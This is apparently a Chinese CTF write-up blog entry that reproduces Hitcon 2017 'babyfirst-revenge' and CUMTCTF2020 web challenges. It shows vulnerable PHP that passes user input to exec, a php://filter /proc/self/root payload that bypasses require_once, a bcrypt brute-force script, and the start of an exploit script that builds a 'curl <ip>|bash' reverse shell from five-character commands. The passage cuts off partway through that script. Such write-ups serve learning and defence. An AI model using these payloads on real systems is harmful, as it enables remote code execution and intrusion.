<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>复现wp</title>
    <url>/2099/09/28/%E5%A4%8D%E7%8E%B0wp/</url>
    <content><![CDATA[<a id="more"></a>
<h2 id="Hitcon2017-babyfirst-reveng"><a href="#Hitcon2017-babyfirst-reveng" class="headerlink" title="Hitcon2017 babyfirst-reveng"></a>Hitcon2017 babyfirst-reveng</h2><p>github复现地址</p>
<p><a href="https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge" target="_blank" rel="noopener">https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge</a></p>
<h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><p>命令执行构造反弹shell</p>
<p>源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>先说几个知识点：</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;e\</span><br><span class="line">&gt;cho\</span><br><span class="line">&#39;123&#39;</span><br><span class="line">&gt;123</span><br></pre></td></tr></table></figure>
<p>在linux中换行可以执行间断的命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># vi 1  //在1下写入cat flag.txt</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># touch flag.txt</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># echo "cumtctf&#123;i_am_so_cute&#125;" &gt;&gt; flag.txt</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># cat flag.txt</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">cumtctf&#123;i_am_so_cute&#125;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># sh 1</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">cumtctf&#123;i_am_so_cute&#125;</span></span><br></pre></td></tr></table></figure>
<p>在Linux下面可以通过写入一个文件，文件里面的内容是系统命令，然后可以通过<code>sh filename</code>来执行文本里面的系统命令，如果有报错的话会自动跳过</p>
</blockquote>
<h1 id="CUMTCTF2020"><a href="#CUMTCTF2020" class="headerlink" title="CUMTCTF2020"></a>CUMTCTF2020</h1><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="简单的文件包含？"><a href="#简单的文件包含？" class="headerlink" title="简单的文件包含？"></a>简单的文件包含？</h2><h3 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h3><p>require_once绕过</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>] != <span class="string">'127.0.0.1'</span> &amp;&amp; $_SERVER[<span class="string">'HTTP_X_REAL_IP'</span>] != <span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] == <span class="string">"127.0.0.1"</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Do u think that I dont know X-Forwarded-For?&lt;br&gt;Too young too simple sometimes naive"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Sorry, this site is only optimized for those who comes from localhost"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'f'</span>])) </span><br><span class="line">  <span class="keyword">include_once</span>($_POST[<span class="string">'f'</span>]);</span><br></pre></td></tr></table></figure>
<p>这里主要问题是<code>reuqire_once</code>的问题</p>
<p><a href="https://www.anquanke.com/post/id/213235#h3-2" target="_blank" rel="noopener">https://www.anquanke.com/post/id/213235#h3-2</a></p>
<p>这里面的源码解析有得还是看不懂，日后再翻</p>
<p>首先说一下php文件包含的机制是将<strong>已经包含的文件与文件的真实路径放进哈希表中</strong>，当已经<code>require_once(&#39;flag.php&#39;)</code>，已经include的文件不可以再<code>require_once</code>。</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br></pre></td></tr></table></figure>
<blockquote>
<p>/proc/self指向当前进程的/proc/pid/</p>
<p>/proc/self/root/指向/的符号</p>
<p><img src="/2099/09/28/%E5%A4%8D%E7%8E%B0wp/image-20200928111221260.png" alt></p>
</blockquote>
<h2 id="👍🙌😃"><a href="#👍🙌😃" class="headerlink" title="👍🙌😃"></a>👍🙌😃</h2><h3 id="考点-2"><a href="#考点-2" class="headerlink" title="考点"></a>考点</h3><p>代码格式化、反混淆，bcrypt爆破，<strong>命令执行</strong></p>
<p>这个题 我只能说真的牛逼</p>
<p>真的开眼界 还可以这样</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Bcrypt</span>\<span class="title">Bcrypt</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>,<span class="string">"Off"</span>);</span><br><span class="line">$🙐=<span class="keyword">array</span>(<span class="string">'🙐'</span>,<span class="string">'🙑'</span>,<span class="string">'🙒'</span>,<span class="string">'🙓'</span>,<span class="string">'🙔'</span>,<span class="string">'🙕'</span>,<span class="string">'🙖'</span>,<span class="string">'🙗'</span>,<span class="string">'🙘'</span>,<span class="string">'🙙'</span>,<span class="string">'🙚'</span>,<span class="string">'🙛'</span>,<span class="string">'🙜'</span>,<span class="string">'🙝'</span>,<span class="string">'🙞'</span>,<span class="string">'🙟'</span>);</span><br><span class="line">$🙠=<span class="keyword">array</span>(<span class="string">'🙠'</span>,<span class="string">'🙡'</span>,<span class="string">'🙢'</span>,<span class="string">'🙣'</span>,<span class="string">'🙤'</span>,<span class="string">'🙥'</span>,<span class="string">'🙦'</span>,<span class="string">'🙧'</span>,<span class="string">'🙨'</span>,<span class="string">'🙩'</span>,<span class="string">'🙪'</span>,<span class="string">'🙫'</span>,<span class="string">'🙬'</span>,<span class="string">'🙭'</span>,<span class="string">'🙮'</span>,<span class="string">'🙯'</span>);</span><br><span class="line">$🙰=<span class="keyword">array</span>(<span class="string">'🙰'</span>,<span class="string">'🙱'</span>,<span class="string">'🙲'</span>,<span class="string">'🙳'</span>,<span class="string">'🙴'</span>,<span class="string">'🙵'</span>,<span class="string">'🙶'</span>,<span class="string">'🙷'</span>,<span class="string">'🙸'</span>,<span class="string">'🙹'</span>,<span class="string">'🙺'</span>,<span class="string">'🙻'</span>,<span class="string">'🙼'</span>,<span class="string">'🙽'</span>,<span class="string">'🙾'</span>,<span class="string">'🙿'</span>);</span><br><span class="line">$😀=<span class="keyword">array</span>(<span class="string">'😀'</span>,<span class="string">'😁'</span>,<span class="string">'😂'</span>,<span class="string">'😃'</span>,<span class="string">'😄'</span>,<span class="string">'😅'</span>,<span class="string">'😆'</span>,<span class="string">'😇'</span>,<span class="string">'😈'</span>,<span class="string">'😉'</span>,<span class="string">'😊'</span>,<span class="string">'😋'</span>,<span class="string">'😌'</span>,<span class="string">'😍'</span>,<span class="string">'😎'</span>,<span class="string">'😏'</span>);</span><br><span class="line">$😐=<span class="keyword">array</span>(<span class="string">'😐'</span>,<span class="string">'😑'</span>,<span class="string">'😒'</span>,<span class="string">'😓'</span>,<span class="string">'😔'</span>,<span class="string">'😕'</span>,<span class="string">'😖'</span>,<span class="string">'😗'</span>,<span class="string">'😘'</span>,<span class="string">'😙'</span>,<span class="string">'😚'</span>,<span class="string">'😛'</span>,<span class="string">'😜'</span>,<span class="string">'😝'</span>,<span class="string">'😞'</span>,<span class="string">'😟'</span>);</span><br><span class="line">$😠=<span class="keyword">array</span>(<span class="string">'😠'</span>,<span class="string">'😡'</span>,<span class="string">'😢'</span>,<span class="string">'😣'</span>,<span class="string">'😤'</span>,<span class="string">'😥'</span>,<span class="string">'😦'</span>,<span class="string">'😧'</span>,<span class="string">'😨'</span>,<span class="string">'😩'</span>,<span class="string">'😪'</span>,<span class="string">'😫'</span>,<span class="string">'😬'</span>,<span class="string">'😭'</span>,<span class="string">'😮'</span>,<span class="string">'😯'</span>);</span><br><span class="line">$😰=<span class="keyword">array</span>(<span class="string">'😰'</span>,<span class="string">'😱'</span>,<span class="string">'😲'</span>,<span class="string">'😳'</span>,<span class="string">'😴'</span>,<span class="string">'😵'</span>,<span class="string">'😶'</span>,<span class="string">'😷'</span>,<span class="string">'😸'</span>,<span class="string">'😹'</span>,<span class="string">'😺'</span>,<span class="string">'😻'</span>,<span class="string">'😼'</span>,<span class="string">'😽'</span>,<span class="string">'😾'</span>,<span class="string">'😿'</span>);</span><br><span class="line">$🙀=<span class="keyword">array</span>(<span class="string">'🙀'</span>,<span class="string">'🙁'</span>,<span class="string">'🙂'</span>,<span class="string">'🙃'</span>,<span class="string">'🙄'</span>,<span class="string">'🙅'</span>,<span class="string">'🙆'</span>,<span class="string">'🙇'</span>,<span class="string">'🙈'</span>,<span class="string">'🙉'</span>,<span class="string">'🙊'</span>,<span class="string">'🙋'</span>,<span class="string">'🙌'</span>,<span class="string">'🙍'</span>,<span class="string">'🙎'</span>,<span class="string">'🙏'</span>);</span><br><span class="line">$🏁 = <span class="keyword">array</span>($🙠,$🙠,$🙰,$😀,$😐,$😠,$😰,$🙀);</span><br><span class="line">$😳😃😢🙉😲😗😦🙅 = <span class="string">"strlen"</span>;</span><br><span class="line">$😩😂😸🙉 = <span class="string">"chr"</span>;</span><br><span class="line">$🎁 = <span class="string">"base64_decode"</span>;</span><br><span class="line">$😱😨😞🙊😪😨😡😍 = <span class="string">"isset"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> 😪😗😦😺😲😂😢😼<span class="params">($😳😃😢🙉)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $🏁,$😳😃😢🙉😲😗😦🙅,$😩😂😸🙉,$🎁,$😱😨😞🙊😪😨😡😍;</span><br><span class="line">	$😲😗😦🙅= (<span class="string">"$😳😃😢🙉😲😗😦🙅"</span>)($😳😃😢🙉)/<span class="number">4</span>;</span><br><span class="line">	$😳😂😚😼 = <span class="string">""</span>;</span><br><span class="line">	<span class="keyword">for</span> ($😱😧😼🙀 = <span class="number">0</span>;$😱😧😼🙀&lt;$😲😗😦🙅;$😱😧😼🙀++) &#123;</span><br><span class="line">		$😩😂😦🙃 =$😳😃😢🙉[$😱😧😼🙀*<span class="number">4</span>].$😳😃😢🙉[$😱😧😼🙀*<span class="number">4</span>+<span class="number">1</span>].$😳😃😢🙉[$😱😧😼🙀*<span class="number">4</span>+<span class="number">2</span>].$😳😃😢🙉[$😱😧😼🙀*<span class="number">4</span>+<span class="number">3</span>];</span><br><span class="line">		$😪😾😞😀 =<span class="number">0</span>;</span><br><span class="line">		$😳😂😦😺 =<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> ($😱😽🙀🙁 =<span class="number">0</span>;$😱😽🙀🙁&lt;<span class="number">8</span>;$😱😽🙀🙁++) &#123;</span><br><span class="line">			<span class="keyword">for</span> ($😱😂🙄🙂=<span class="number">0</span>;$😱😂🙄🙂&lt;<span class="number">16</span>;$😱😂🙄🙂++) &#123;</span><br><span class="line">				<span class="keyword">if</span>($😩😂😦🙃 == $🏁[$😱😽🙀🙁][$😱😂🙄🙂]) &#123;</span><br><span class="line">					$😪😾😞😀=$😱😽🙀🙁;</span><br><span class="line">					$😳😂😦😺 = $😱😂🙄🙂;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		$😲😾😦🙄 = $😪😾😞😀*<span class="number">16</span>+$😳😂😦😺;</span><br><span class="line">		$😳😂😚😼 = $😳😂😚😼.(<span class="string">"$😩😂😸🙉"</span>)($😲😾😦🙄);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (<span class="string">"$🎁"</span>)($😳😂😚😼);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> 😁😁<span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $🏁,$😳😃😢🙉😲😗😦🙅,$😩😂😸🙉,$🎁,$😱😨😞🙊😪😨😡😍;</span><br><span class="line">	$😳😂😖🙅😪😗😚 = 😪😗😦😺😲😂😢😼(😜😃😪😸😳😹😉😃😴😃😳🙆😱😘😢🙄😲😓😉🙊😩😧😅😻😩😽😉😄😜🙇😍😍).😪😗😦😺😲😂😢😼(😲😧😡😁)($_SERVER[😪😗😦😺😲😂😢😼(😥😻😦😞😤😁😢😖😨😀😖😕😢😖😙😍)]);</span><br><span class="line">	😪😗😦😺😲😂😢😼(😲😧🙄😻😱😨😙😍)($😳😂😖🙅😪😗😚);</span><br><span class="line">	😪😗😦😺😲😂😢😼(😩😂😸😻😱😨😙😍)($😳😂😖🙅😪😗😚);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[😪😗😦😺😲😂😢😼(😩😂😁😻)]) &amp;&amp; ($😳😃😢🙉😲😗😦🙅)($_GET[😪😗😦😺😲😂😢😼(😩😂😁😻)]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">		@😪😗😦😺😲😂😢😼(😪😨😸😼😩🙇😍😍)($_GET[😪😗😦😺😲😂😢😼(😩😂😁😻)]);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[😪😗😦😺😲😂😢😼(😳😽😦🙊😪😨😡😍)])) &#123;</span><br><span class="line">		@😪😗😦😺😲😂😢😼(😪😨😸😼😩🙇😍😍)(😪😗😦😺😲😂😢😼(😳😽😀😷😜😨😚😽😙😑😍😍) . $😳😂😖🙅😪😗😚);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$🎯 = <span class="keyword">new</span> Bcrypt();</span><br><span class="line">$🔑 = $_POST[😪😗😦😺😲😂😢😼(😳😗😖🙊😳😃😴😻)];</span><br><span class="line">$🔒 = 😪😗😦😺😲😂😢😼(😚😔😚😅😚😔😕🙇😚😖😚😓😪😽😻😄😥😨😒😛😣😼😖😢😲😥🙀😕😞😻😪😅😲😘😦🙉😣😽😦🙈😲😦😑🙅😞😽😞😞😲😺😴😀😪😗😉😜😩😃🙀😝😝😾😩😅😱😖😞😺😪😔😼😆😢😗😿🙊😴😁😸😼);</span><br><span class="line"><span class="keyword">if</span>($🎯-&gt;verify($🔑, $🔒)) &#123;</span><br><span class="line">	<span class="keyword">echo</span>(😪😗😦😺😲😂😢😼(😠😓😉😹😳😺😅😡😩😨😞🙊😴😂😉🙉😪😓😒😂😪😨😚🙀😪😽😼😼😪😓😕😈😜😂😚🙉😠😷😍😍));</span><br><span class="line">	<span class="keyword">echo</span>(😪😗😦😺😲😂😢😼(😦😂😉😃😙😣😖😟😲😃😳🙃😱😗😖😺😱🙉😒🙀😴😓😕😈😜😂😚🙉😠😷😍😍));</span><br><span class="line">	😁😁();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span>(😪😗😦😺😲😂😢😼(😠😓😉😹😳😺😅😡😩😨😞🙊😴😂😉🙉😪😓😒🙅😲😃😡😷😲😧😖😀😩😂😷😸😠😓😉😹😳😺😄😍));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先是代码格式化，接着就是<strong>理解代码的执行逻辑，顺便改变代码逻辑</strong></p>
<p>看题解上看的是第一个函数，也就是混淆</p>
<p>为什么要先看第一个函数</p>
<p><img src="/2099/09/28/%E5%A4%8D%E7%8E%B0wp/image-20200929221307190.png" alt="image-20200929221307190"></p>
<p>所以我们就想直接看在不同参数下第一个函数执行输出的结果，所以在第一个函数中添加</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> 😪😗😦😺😲😂😢😼<span class="params">($😳😃😢🙉)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"加密后："</span>.$😳😃😢🙉;</span><br><span class="line">	<span class="keyword">global</span> $🏁,$😳😃😢🙉😲😗😦🙅,$😩😂😸🙉,$🎁,$😱😨😞🙊😪😨😡😍;</span><br><span class="line">	$😲😗😦🙅= (<span class="string">"$😳😃😢🙉😲😗😦🙅"</span>)($😳😃😢🙉)/<span class="number">4</span>;</span><br><span class="line">	$😳😂😚😼 = <span class="string">""</span>;</span><br><span class="line">	<span class="keyword">for</span> ($😱😧😼🙀 = <span class="number">0</span>;$😱😧😼🙀&lt;$😲😗😦🙅;$😱😧😼🙀++) &#123;</span><br><span class="line">		$😩😂😦🙃 =$😳😃😢🙉[$😱😧😼🙀*<span class="number">4</span>].$😳😃😢🙉[$😱😧😼🙀*<span class="number">4</span>+<span class="number">1</span>].$😳😃😢🙉[$😱😧😼🙀*<span class="number">4</span>+<span class="number">2</span>].$😳😃😢🙉[$😱😧😼🙀*<span class="number">4</span>+<span class="number">3</span>];</span><br><span class="line">		$😪😾😞😀 =<span class="number">0</span>;</span><br><span class="line">		$😳😂😦😺 =<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> ($😱😽🙀🙁 =<span class="number">0</span>;$😱😽🙀🙁&lt;<span class="number">8</span>;$😱😽🙀🙁++) &#123;</span><br><span class="line">			<span class="keyword">for</span> ($😱😂🙄🙂=<span class="number">0</span>;$😱😂🙄🙂&lt;<span class="number">16</span>;$😱😂🙄🙂++) &#123;</span><br><span class="line">				<span class="keyword">if</span>($😩😂😦🙃 == $🏁[$😱😽🙀🙁][$😱😂🙄🙂]) &#123;</span><br><span class="line">					$😪😾😞😀=$😱😽🙀🙁;</span><br><span class="line">					$😳😂😦😺 = $😱😂🙄🙂;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		$😲😾😦🙄 = $😪😾😞😀*<span class="number">16</span>+$😳😂😦😺;</span><br><span class="line">		$😳😂😚😼 = $😳😂😚😼.(<span class="string">"$😩😂😸🙉"</span>)($😲😾😦🙄);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"原文："</span>.(<span class="string">"$🎁"</span>)($😳😂😚😼);</span><br><span class="line">	<span class="keyword">return</span> (<span class="string">"$🎁"</span>)($😳😂😚😼);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>之后依次修改代码逻辑，替换其中第一个函数输出结果</p>
<p>核心代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> 😁😁<span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $🏁,$strlen,$chr,$base64_decode,$isset;</span><br><span class="line">	$path = <span class="string">"/var/www/html/sandbox/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">	mkdir($path);</span><br><span class="line">	chdir($path);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">		@exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">		<span class="comment">//</span></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">		@exec(<span class="string">"rm -rf"</span> . $path);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$🎯 = <span class="keyword">new</span> Bcrypt();</span><br><span class="line"></span><br><span class="line">$🔑 = $_POST[<span class="string">"passwd"</span>];</span><br><span class="line">$🔒 = <span class="string">"$2y$10$RBfi8QpJJQQmJD6FylurJeqmP.6cMn7tdoKczL2v9hScd9zDj3wXe"</span>;</span><br><span class="line"><span class="keyword">if</span>($🎯-&gt;verify($passwd, $lock)) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Password verified!"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Wow!!Now,hack it!"</span>;</span><br><span class="line">	😁😁();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;Password not match!&lt;/br&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后发现有composer包，安装，然后查资料bcrypt</p>
<h3 id="bcrypt"><a href="#bcrypt" class="headerlink" title="bcrypt"></a>bcrypt</h3><p><code>bcrypt</code>是一种哈希算法，可以通过硬件进行扩展（通过可配置的循环次数）。</p>
<p><strong><code>bcrypt</code>是一种单向哈希算法。</strong>如果不知道盐，圆<strong>和密码</strong>（密码），则无法检索纯文本密码。</p>
<blockquote>
<p>加盐：</p>
<p>就是人为的通过一组随机字符与用户原密码的组合形成一个新的字符，从而增加破译的难度。</p>
</blockquote>
<p>在php中，主要有内置的函数<code>password_hash</code>和<code>password_verify</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = password_hash(<span class="string">'password'</span>,PASSWORD_DEFAULT);</span><br><span class="line"><span class="keyword">echo</span> $a.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(password_verify(<span class="string">'password'</span>,$a))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"failed"</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(password_get_info($a));</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出信息</span></span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">3</span>)</span><br><span class="line">  <span class="string">'algo'</span> =&gt; int <span class="number">1</span></span><br><span class="line">  <span class="string">'algoName'</span> =&gt; string <span class="string">'bcrypt'</span> (length=<span class="number">6</span>)</span><br><span class="line">  <span class="string">'options'</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (size=<span class="number">1</span>)</span><br><span class="line">      <span class="string">'cost'</span> =&gt; int <span class="number">10</span></span><br><span class="line">$a = password_hash(<span class="string">'password'</span>,PASSWORD_DEFAULT,<span class="keyword">array</span>(<span class="string">'cost'</span> =&gt; <span class="number">11</span>));</span><br><span class="line"><span class="comment">//相应的cost也会变为11；</span></span><br></pre></td></tr></table></figure>
<p>接下来就是爆破，已知密码为bcrypt+4位小写字母</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>; </span><br><span class="line"><span class="keyword">use</span> <span class="title">Bcrypt</span>\<span class="title">Bcrypt</span>; </span><br><span class="line">$key = <span class="string">"abcdefghijklmnopqrstuvwxyz"</span>; </span><br><span class="line">$bcrypt = <span class="keyword">new</span> Bcrypt(); </span><br><span class="line">$plaintext = <span class="string">'bcrypt'</span>;<span class="comment">//bcryptyyds </span></span><br><span class="line">$ciphertext = <span class="string">'$2y$10$RBfi8QpJJQQmJD6FylurJeqmP.6cMn7tdoKczL2v9hScd9zDj3wXe'</span>; </span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">26</span>;$i++) &#123; </span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;<span class="number">26</span>;$j++) &#123; </span><br><span class="line">        <span class="keyword">for</span>($k=<span class="number">0</span>;$k&lt;<span class="number">26</span>;$k++) &#123; </span><br><span class="line">            <span class="keyword">for</span>($m=<span class="number">0</span>;$m&lt;<span class="number">26</span>;$m++) &#123; </span><br><span class="line">                <span class="keyword">echo</span> $plaintext.$str.PHP_EOL; </span><br><span class="line">                $str = $key[$i].$key[$j].$key[$k].$key[$m]; </span><br><span class="line">                <span class="keyword">if</span>($bcrypt-&gt;verify($plaintext.$str, $ciphertext))&#123; </span><br><span class="line">                    <span class="keyword">echo</span>(<span class="string">"&lt;/br&gt;Password verified!&lt;/br&gt;"</span>); </span><br><span class="line">                    <span class="keyword">echo</span>(<span class="string">"Wow!!Now,hack it!&lt;/br&gt;"</span>); </span><br><span class="line">                &#125; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>最终的考点就是命令执行可以参考hitcon-ctf-2017</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> 😁😁<span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $🏁,$strlen,$chr,$base64_decode,$isset;</span><br><span class="line">	$path = <span class="string">"/var/www/html/sandbox/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">	mkdir($path);</span><br><span class="line">	chdir($path);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">		@exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">		<span class="comment">//</span></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">		@exec(<span class="string">"rm -rf"</span> . $path);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这道题大概意思就是存在命令执行，但单次输入字符不得大于5。因此利用linux下特有的命令来写入shell反弹。原理就是利用curl ip|bash等很多方式去反弹shell。顺便也复习了反弹shell的一些基本操作</p>
<p>官方的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">url = <span class="string">"http://219.219.61.234:10048/?cmd="</span></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate "g&gt; ht- sl" to file "v"</span></span><br><span class="line">    <span class="string">'&gt;dir'</span>,</span><br><span class="line">    <span class="string">'&gt;sl'</span>,</span><br><span class="line">    <span class="string">'&gt;g\&gt;'</span>,</span><br><span class="line">    <span class="string">'&gt;ht-'</span>,</span><br><span class="line">    <span class="string">'*&gt;v'</span>,</span><br><span class="line">    <span class="comment"># reverse file "v" to file "x", content "ls -th &gt;g" '</span></span><br><span class="line">    <span class="string">'&gt;rev'</span>,</span><br><span class="line">    <span class="string">'*v&gt;x'</span>,</span><br><span class="line">    <span class="comment"># generate "curl 0X2761697D|bash"</span></span><br><span class="line">    <span class="string">'&gt;sh '</span>,</span><br><span class="line">    <span class="string">'&gt;ba\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\|\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\\'</span>,</span><br><span class="line">    <span class="string">'&gt;7D\\'</span>,</span><br><span class="line">    <span class="string">'&gt;69\\'</span>,</span><br><span class="line">    <span class="string">'&gt;61\\'</span>,</span><br><span class="line">    <span 